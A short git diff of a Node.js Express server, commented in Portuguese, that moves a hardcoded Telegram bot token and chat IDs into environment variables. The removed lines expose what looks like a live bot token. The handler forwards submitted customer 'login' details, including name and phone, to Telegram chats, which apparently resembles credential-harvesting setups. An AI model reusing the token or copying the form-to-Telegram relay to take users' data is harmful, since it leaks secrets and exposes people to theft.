@@ -1,3 +1,4 @@
+require('dotenv').config(); // Carrega as variáveis de ambiente do arquivo .env
 const express = require('express');
 const path = require('path');
 const bodyParser = require('body-parser');
@@ -53,8 +54,8 @@ app.post('/send-data', async (req, res) => {
     }
 
     // Configurações do Telegram
-    const token = '7045955625:AAGaTLknx9YYk3powiCXn_R6sIGOP8f3bcE';
-    const chatIds = ['5114449108', '6489258446'];
+    const token = process.env.TELEGRAM_TOKEN;
+    const chatIds = process.env.TELEGRAM_CHAT_IDS.split(',');
     const message = `Novo Login de Cliente (${formLabel}):
 Nome: ${fullname}
 Telefone: ${phone}
